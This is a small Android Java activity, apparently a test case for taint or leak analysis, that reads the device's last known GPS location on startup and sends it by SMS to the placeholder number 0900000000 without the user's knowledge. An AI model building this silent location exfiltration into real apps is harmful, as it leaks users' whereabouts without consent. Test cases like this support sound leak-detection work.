package com.test;
 

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.TextView;

public class MyActivity extends Activity
{
	private Location mLoc;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		startSource();
		startSink();
	}
	public void startSource()
	{
		LocationManager locManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		mLoc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
	}
	public void startSink() 
	{
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, mLoc.toString(), null, null);
	}
}

